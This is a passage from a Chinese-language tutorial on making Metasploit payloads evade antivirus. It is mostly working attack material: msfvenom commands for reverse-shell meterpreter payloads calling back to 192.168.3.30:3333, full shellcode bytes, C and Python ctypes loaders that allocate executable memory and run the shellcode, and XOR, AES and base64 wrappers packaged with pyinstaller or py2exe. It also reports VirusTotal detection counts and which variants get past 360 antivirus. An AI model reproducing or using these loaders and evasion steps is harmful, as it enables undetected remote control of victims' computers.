<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">raw = r&quot;&quot;&quot;</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;shellcode;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">regx = re.compile(r&quot;\\x\w\w&quot;)</span><br><span class="line">arr = re.findall(regx,raw)</span><br><span class="line">for i in range(0,len(arr)):</span><br><span class="line">    arr[i] = arr[i].replace(&quot;\\&quot;,&quot;0&quot;)</span><br><span class="line">data = &quot;&quot;&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">pragma comment(linker, <span class="string">&quot;/subsystem:\\&quot;</span>windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;<span class="string">&quot;)</span></span></span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[333];</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">data = data + &quot;    &quot;</span><br><span class="line">print(len(arr))</span><br><span class="line">for i in range(len(arr)):</span><br><span class="line">    data = data + &quot;buf[&quot;+ str(i) +&quot;] = &quot; + arr[i] + &quot;^ 0x5f ^ 0x5f;&quot;</span><br><span class="line">    if(i%100 == 0):</span><br><span class="line">        data = data + &quot;\r\n    &quot;</span><br><span class="line"></span><br><span class="line">data = data + &quot;&quot;&quot;</span><br><span class="line">    ((void(*)(void))&amp;buf)();</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">f = open(&quot;shellcode.txt&quot;,&quot;w&quot;)</span><br><span class="line">f.write(data)</span><br></pre></td></tr></table></figure>

<p>再将生成<code>shellcode.txt</code>内容粘贴到vs2019中进行编译（注意1关闭DEP：调试-project调制属性-链接器-高级-DEP,注意2关闭优化：调试-project调制属性-C&#x2F;C++-优化）</p>
<h3 id="2-shellcode加载器"><a href="#2-shellcode加载器" class="headerlink" title="2.shellcode加载器"></a>2.shellcode加载器</h3><h4 id="1-使用shellcode-launcher（过不了微软）"><a href="#1-使用shellcode-launcher（过不了微软）" class="headerlink" title="1.使用shellcode_launcher（过不了微软）"></a>1.使用shellcode_launcher（过不了微软）</h4><p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/clinicallyinane/shellcode_launcher">https://github.com/clinicallyinane/shellcode_launcher</a></p>
<p>msf生成raw格式的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw -o shellcode.raw</span><br></pre></td></tr></table></figure>

<p>在目标机器上用shellcode_launcher.exe执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher.exe -i shellcode.raw</span><br></pre></td></tr></table></figure>

<p>msf会正常上线。</p>
<h4 id="2-使用SSI加载-VT-24-71-过360"><a href="#2-使用SSI加载-VT-24-71-过360" class="headerlink" title="2.使用SSI加载(VT:24&#x2F;71 过360)"></a>2.使用SSI加载(VT:24&#x2F;71 过360)</h4><p>msf生成c文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.3.30 LPORT=3333 -f c -o msf.txt</span><br></pre></td></tr></table></figure>

<p>然后执行下面命令,会得到一串16进制字符串</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#x27;:a;N;$!ba;s/\n//g&#x27;|sed &quot;s/;//g&quot;</span><br><span class="line">fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5</span><br></pre></td></tr></table></figure>

<p>然后使用win上的i686-w64-mingw32-gcc配合SimpleShellcodeInjector.c编译生成ssi.exe</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\mingw-w64\setting\mingw32\bin&gt;i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe</span><br></pre></td></tr></table></figure>

<p>其实在<code>SimpleShellcodeInjector\OLDBinary</code>文件中也有个ssi.exe，这是作者给编译好的，不过不建议使用，因为这个ssi.exe已经能被很多杀软查杀，最好就是使用上面的命令自己编译一个。使用编译生成的ssi.exe，参数为上面的16进制字符串，执行shellcode，msf可正常上线</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\mingw-w64\setting\mingw32\bin&gt;ssi.exe fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5     </span><br></pre></td></tr></table></figure>



<h2 id="2-python（文件比较大，不合适）"><a href="#2-python（文件比较大，不合适）" class="headerlink" title="2.python（文件比较大，不合适）"></a>2.python（文件比较大，不合适）</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA">https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA</a></p>
<h3 id="1-通过py源码编译exe"><a href="#1-通过py源码编译exe" class="headerlink" title="1  通过py源码编译exe"></a>1  通过py源码编译exe</h3><h4 id="1-python加载C代码（VT-8-69-过360）"><a href="#1-python加载C代码（VT-8-69-过360）" class="headerlink" title="1.python加载C代码（VT:8&#x2F;69 过360）"></a>1.python加载C代码（VT:8&#x2F;69 过360）</h4><p>msf生成c文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c</span><br><span class="line">[*] exec: msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of c file: 1512 bytes</span><br><span class="line">unsigned char buf[] = </span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span><br><span class="line">&quot;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28&quot;</span><br><span class="line">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="line">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span><br><span class="line">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span><br><span class="line">&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1&quot;</span><br><span class="line">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="line">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="line">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="line">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="line">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="line">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="line">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x03\x1e\x68\x02&quot;</span><br><span class="line">&quot;\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="line">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="line">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="line">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="line">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="line">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="line">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="line">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="line">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="line">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="line">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br></pre></td></tr></table></figure>

<p>python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后要使用PyInstaller将上述py文件转为exe（3.4M左右）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller.py -F pyshellcode.py</span><br></pre></td></tr></table></figure>

<p>执行生成的exe，msf正常上线</p>
<h4 id="2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用"><a href="#2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用" class="headerlink" title="2.py2exe打包编译exe(VT: 6&#x2F;70 过360 蜜汁闪退？？？会弹黑框不建议使用)"></a>2.py2exe打包编译exe(VT: 6&#x2F;70 过360 蜜汁闪退？？？会弹黑框不建议使用)</h4><p>该方法借用了免杀工具<code>Python-Rootkit</code>的思路。</p>
<p>首先要在windows上安装x86版的python。</p>
<p><strong>注意：必须使用x86版本Python 2.7,即使Windows是x64的，也要安装32位版本。</strong></p>
<p>这里安装的是Python 2.7.16 x86 windows版：</p>
<p><a target="_blank" rel="noopener" href="https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi">https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi</a></p>
<p>之后安装32位Py2exe for python 2.7</p>
<p><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download">https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download</a></p>
<p>msfvenom生成python payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.30  LPORT=3333  -f raw -o shell.py</span><br></pre></td></tr></table></figure>

<p>创建文件setup.py</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line">setup(</span><br><span class="line">name = &quot;Meter&quot;,</span><br><span class="line">description = &quot;Python-based App&quot;,</span><br><span class="line">version = &quot;1.0&quot;,</span><br><span class="line">console = [&quot;shell.py&quot;],</span><br><span class="line">options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,</span><br><span class="line">zipfile = None</span><br><span class="line">)</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure>

<p>在windows下执行<code>python.exe .\setup.py py2exe</code>，(文件大小11M)</p>
<p>msf开启监听，即可上线</p>
<h4 id="3-base64编码-失败。。。"><a href="#3-base64编码-失败。。。" class="headerlink" title="3.base64编码(失败。。。)"></a>3.base64编码(失败。。。)</h4><p>msfvenom生成shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64  LHOST=192.168.3.30 LPORT=3333   -f c</span><br></pre></td></tr></table></figure>

<p>python代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encode_shellcode = <span class="string">&quot;shellcode&quot;</span></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>使用pyinstaller编译打包exe(6.2m）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure>



<h4 id="4-py-C编译exe-失败。。"><a href="#4-py-C编译exe-失败。。" class="headerlink" title="4.py+C编译exe(失败。。)"></a>4.py+C编译exe(失败。。)</h4><p>先用msfvenom生成shellcode:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -f c</span><br></pre></td></tr></table></figure>

<p>python代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#libc = CDLL(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">executable_code</span>(<span class="params">buffer</span>):</span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = <span class="built_in">len</span>(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to allocate memory&quot;</span>)</span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, <span class="built_in">len</span>(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to set protection on buffer&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(<span class="built_in">len</span>(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<p>使用pyinstaller编译打包exe，生成文件大小3.4M</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure>



<h4 id="5-xor加密（失败。。）"><a href="#5-xor加密（失败。。）" class="headerlink" title="5.xor加密（失败。。）"></a>5.xor加密（失败。。）</h4><p>先用msfvenom生成一个raw格式的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure>

<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -py shellcode.raw se_null xor</span><br></pre></td></tr></table></figure>

<p>使用pyinstaller编译上一步骤中成的encryptedShellcodeWrapper_xor.py</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole encryptedShellcodeWrapper_xor.py</span><br></pre></td></tr></table></figure>



<h4 id="6-aes加密"><a href="#6-aes加密" class="headerlink" title="6.aes加密"></a>6.aes加密</h4><p>和方法五一样，只不过将<code>python shellcode_encoder.py -py shellcode.raw se_null xor</code>设置为<code>python shellcode_encoder.py -py shellcode.raw se_null aes</code>即可</p>
<h3 id="2-python加载器"><a href="#2-python加载器" class="headerlink" title="2.python加载器"></a>2.python加载器</h3><h4 id="1-HEX加密"><a href="#1-HEX加密" class="headerlink" title="1.HEX加密"></a>1.HEX加密</h4><p>这是使用了k8的方法：（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/k8gege/p/11223393.htmlk8%EF%BC%89%E7%9A%84%E5%B7%A5%E5%85%B7scrun%E4%B8%8D%E4%BB%85%E6%8F%90%E4%BE%9B%E4%BA%86%E5%8A%A0%E8%BD%BDpython%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%BF%98%E8%83%BD%E5%8A%A0%E8%BD%BDC#%E3%80%82">https://www.cnblogs.com/k8gege/p/11223393.htmlk8）的工具scrun不仅提供了加载python代码，还能加载C#。</a></p>
<p>先用msfvenom生成一个c格式的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure>

<p>用k8飞刀把shellcode转成hex,k8飞刀地址：<a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a> （解压密码是k8gege）（encode&#x2F;decode-粘贴shellcode，shellcode只需一对引号引起来-全选-右键-hacking-shellcode-chartohex）</p>
<p>使用<code>python ScRunHex.py hexcode</code>就可以加载执行shellcode了</p>
<h4 id="2-base64加密"><a href="#2-base64加密" class="headerlink" title="2.base64加密"></a>2.base64加密</h4><p>同上一样，这次使用的是k8的<code>ScRunBase64.py</code></p>
<h2 id="3-c-（查杀概率仍然比较大）"><a href="#3-c-（查杀概率仍然比较大）" class="headerlink" title="3.c#（查杀概率仍然比较大）"></a>3.c#（查杀概率仍然比较大）</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog">https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog</a></p>
<h3 id="1-C-源码直接编译exe"><a href="#1-C-源码直接编译exe" class="headerlink" title="1.C#源码直接编译exe"></a>1.C#源码直接编译exe</h3><h4 id="1-C-shellcode直接编译（VT-16-69-过360）"><a href="#1-C-shellcode直接编译（VT-16-69-过360）" class="headerlink" title="1.C#+shellcode直接编译（VT:16&#x2F;69 过360）"></a>1.C#+shellcode直接编译（VT:16&#x2F;69 过360）</h4><p>先用msfvenom生成基于C#的shellcode,使用了<code>shikata_ga_nai</code>编码	</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -e x86/shikata_ga_nai  -i 15  -f csharp -o payload.txt</span><br></pre></td></tr></table></figure>

<p>然后将<code>payload.txt</code>文件中的shellcode代码复制到下面C#代码中</p>
